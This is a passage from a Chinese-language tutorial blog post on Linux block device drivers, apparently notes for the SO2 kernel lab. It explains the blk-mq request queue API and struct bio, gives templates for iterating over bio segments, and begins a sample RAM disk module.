error)</span></span>; <span class="comment">/* 结束请求处理并通知上层 */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">blk_rq_is_passthrough</span><span class="params">(struct request *rq)</span></span>; <span class="comment">/* 验证请求类型 */</span></span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genhd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blkdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_block_dev</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_tag_set</span> <span class="title">tag_set</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">request_queue</span> *<span class="title">queue</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; dev;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">blk_status_t</span> <span class="title">my_block_request</span><span class="params">(struct blk_mq_hw_ctx *hctx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">const</span> struct blk_mq_queue_data *bd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">request</span> *<span class="title">rq</span> =</span> bd-&gt;rq;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_block_dev</span> *<span class="title">dev</span> =</span> q-&gt;queuedata;</span><br><span class="line">    blk_mq_start_request(rq);</span><br><span class="line">    <span class="keyword">if</span> (blk_rq_is_passthrough(rq)) &#123;</span><br><span class="line">        printk (KERN_NOTICE <span class="string">&quot;Skip non-fs request\n&quot;</span>);</span><br><span class="line">        blk_mq_end_request(rq, BLK_STS_IOERR);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* do work */</span></span><br><span class="line">    ...</span><br><span class="line">    blk_mq_end_request(rq, BLK_STS_OK);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> BLK_STS_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_ops</span> <span class="title">my_queue_ops</span> =</span> &#123;</span><br><span class="line">   .queue_rq = my_block_request,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">create_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Initialize tag set. */</span></span><br><span class="line">    dev-&gt;tag_set.ops = &amp;my_queue_ops;</span><br><span class="line">    dev-&gt;tag_set.nr_hw_queues = <span class="number">1</span>;</span><br><span class="line">    dev-&gt;tag_set.queue_depth = <span class="number">128</span>;</span><br><span class="line">    dev-&gt;tag_set.numa_node = NUMA_NO_NODE;</span><br><span class="line">    dev-&gt;tag_set.cmd_size = <span class="number">0</span>;</span><br><span class="line">    dev-&gt;tag_set.flags = BLK_MQ_F_SHOULD_MERGE;</span><br><span class="line">    err = blk_mq_alloc_tag_set(&amp;dev-&gt;tag_set);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out_err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate queue. */</span></span><br><span class="line">    dev-&gt;<span class="built_in">queue</span> = blk_mq_init_queue(&amp;dev-&gt;tag_set);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(dev-&gt;<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out_blk_init;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    blk_queue_logical_block_size(dev-&gt;<span class="built_in">queue</span>, KERNEL_SECTOR_SIZE);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Assign private data to queue structure. */</span></span><br><span class="line">    dev-&gt;<span class="built_in">queue</span>-&gt;queuedata = dev;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">out_blk_init:</span><br><span class="line">    blk_mq_free_tag_set(&amp;dev-&gt;tag_set);</span><br><span class="line">out_err:</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_block_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    status = create_block_device(&amp;dev);</span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_block_device</span><span class="params">(struct block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    blk_mq_free_tag_set(&amp;dev-&gt;tag_set);</span><br><span class="line">    blk_cleanup_queue(dev-&gt;<span class="built_in">queue</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    delete_block_device(&amp;dev);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Structure struct bio</strong></p>
<p>Linux Block 层 作为 IO 子系统的中间层，他为上层输出接口，为下层提供数据，在整个 block 层的最小单位，不可分割</p>
<p>结构体 <code>bio</code> 用于描述一个内存块：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio</span>		*<span class="title">bi_next</span>;</span>	<span class="comment">/* request queue link */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">gendisk</span>		*<span class="title">bi_disk</span>;</span> <span class="comment">/* 表示一个独立的磁盘设备 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		bi_opf; <span class="comment">/* 标志信息 */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		bi_flags;	<span class="comment">/* status, etc and bvec pool number */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		bi_ioprio;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		bi_write_hint;</span><br><span class="line">	<span class="keyword">blk_status_t</span>		bi_status;</span><br><span class="line">	u8			bi_partno;</span><br><span class="line">	<span class="keyword">atomic_t</span>		__bi_remaining;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bvec_iter</span>	<span class="title">bi_iter</span>;</span> <span class="comment">/* 迭代器(用来遍历bvec,也就是bio数据区) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">bio_end_io_t</span>		*bi_end_io;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span>			*bi_private;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BLK_CGROUP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">blkcg_gq</span>		*<span class="title">bi_blkg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_issue</span>	<span class="title">bi_issue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BLK_CGROUP_IOCOST</span></span><br><span class="line">	u64			bi_iocost_cost;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BLK_INLINE_ENCRYPTION</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_crypt_ctx</span>	*<span class="title">bi_crypt_context</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_BLK_DEV_INTEGRITY)</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bio_integrity_payload</span> *<span class="title">bi_integrity</span>;</span> <span class="comment">/* data integrity */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		bi_vcnt;	<span class="comment">/* how many bio_vec&#x27;s */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		bi_max_vecs;	<span class="comment">/* max bvl_vecs we can hold */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">atomic_t</span>		__bi_cnt;	<span class="comment">/* pin count */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>		*<span class="title">bi_io_vec</span>;</span>	<span class="comment">/* the actual vec list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_set</span>		*<span class="title">bi_pool</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>		<span class="title">bi_inline_vecs</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>相关 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bio *<span class="title">bio_alloc</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_iovecs)</span></span>; <span class="comment">/* 用于处理请求队列的有用函数 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调用 <code>bio_alloc</code> 以后，往往需要马上填充 <code>bio</code> 中的条目（尤其是：<code>bi_disk</code>，<code>bi_iter</code>，<code>bi_opf</code>），案例如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> *<span class="title">bio</span> =</span> bio_alloc(GFP_NOIO, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">bio-&gt;bi_disk = bdev-&gt;bd_disk;</span><br><span class="line">bio-&gt;bi_iter.bi_sector = sector;</span><br><span class="line">bio-&gt;bi_opf = REQ_OP_READ;</span><br><span class="line">page = alloc_page(GFP_NOIO);</span><br><span class="line">bio_add_page(bio, page, size, offset);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>如果想要对 <code>bio</code> 进行操作（增删改查），必须将该结构的支持页面映射到对应的内核地址空间，操作完毕后再把映射解除</p>
<ul>
<li>对于 mapping/unmapping 映射，请使用 <code>kmap_atomic</code> 和 <code>kunmap_atomic</code> 宏</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kmap_atomic(page) <span class="comment">/* 为物理页page建立内存映射 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kunmap_atomic(addr) <span class="comment">/* 解除虚拟地址addr的内存映射 */</span></span></span><br></pre></td></tr></table></figure>
<p>遍历 <code>bio</code> 并输出其关联内容的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_transfer</span><span class="params">(struct my_block_dev *dev, <span class="keyword">size_t</span> start,</span></span></span><br><span class="line"><span class="params"><span class="function">                              <span class="keyword">size_t</span> len, <span class="keyword">char</span> *buffer, <span class="keyword">int</span> dir)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_xfer_bio</span><span class="params">(struct my_block_dev *dev, struct bio *bio)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> <span class="title">bvec</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bvec_iter</span> <span class="title">iter</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do each segment independently. */</span></span><br><span class="line">    bio_for_each_segment(bvec, bio, iter) &#123;</span><br><span class="line">        <span class="keyword">sector_t</span> sector = iter.bi_sector;</span><br><span class="line">        <span class="keyword">char</span> *buffer = kmap_atomic(bvec.bv_page);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> offset = bvec.bv_offset;</span><br><span class="line">        <span class="keyword">size_t</span> len = bvec.bv_len;</span><br><span class="line">        <span class="keyword">int</span> dir = bio_data_dir(bio);</span><br><span class="line">        printk(KERN_LOG_LEVEL <span class="string">&quot;%s: buf %8p offset %lu len %u dir %d\n&quot;</span>, __func__, buffer, offset, len, dir);</span><br><span class="line">        <span class="comment">/* process mapped buffer */</span></span><br><span class="line">        my_block_transfer(dev, sector, len, buffer + offset, dir);</span><br><span class="line">        kunmap_atomic(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_xfer_request</span><span class="params">(struct my_block_dev *dev, struct request *req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> <span class="title">bvec</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">req_iterator</span> <span class="title">iter</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do each segment independently. */</span></span><br><span class="line">    rq_for_each_segment(bvec, req, iter) &#123;</span><br><span class="line">        <span class="keyword">sector_t</span> sector = iter.iter.bi_sector;</span><br><span class="line">        <span class="keyword">char</span> *buffer = kmap_atomic(bvec.bv_page);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> offset = bvec.bv_offset;</span><br><span class="line">        <span class="keyword">size_t</span> len = bvec.bv_len;</span><br><span class="line">        <span class="keyword">int</span> dir = bio_data_dir(bio);</span><br><span class="line">        printk(KERN_LOG_LEVEL <span class="string">&quot;%s: buf %8p offset %lu len %u dir %d\n&quot;</span>, __func__, buffer, offset, len, dir);</span><br><span class="line">        <span class="comment">/* process mapped buffer */</span></span><br><span class="line">        my_block_transfer(dev, sector, len, buffer + offset, dir);</span><br><span class="line">        kunmap_atomic(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这两个模板比较固定，可以直接拿出来用</li>
</ul>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=block_device_drivers make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>Test1 完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 - Block device drivers lab (#7)</span></span><br><span class="line"><span class="comment"> * Linux - Exercise #1, #2, #3, #6 (RAM Disk)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genhd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blkdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blk_types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blkdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blk-mq.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple RAM Disk&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_LOG_LEVEL		KERN_ALERT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BLOCK_MAJOR		240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BLKDEV_NAME		<span class="meta-string">&quot;mybdev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BLOCK_MINORS		1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_SECTORS		128</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_SECTOR_SIZE	512</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 6: use bios for read/write requests */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USE_BIO_TRANSFER	0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_block_dev</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_tag_set</span> <span class="title">tag_set</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">request_queue</span> *<span class="title">queue</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">gendisk</span> *<span class="title">gd</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">&#125; g_dev;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_block_open</span><span 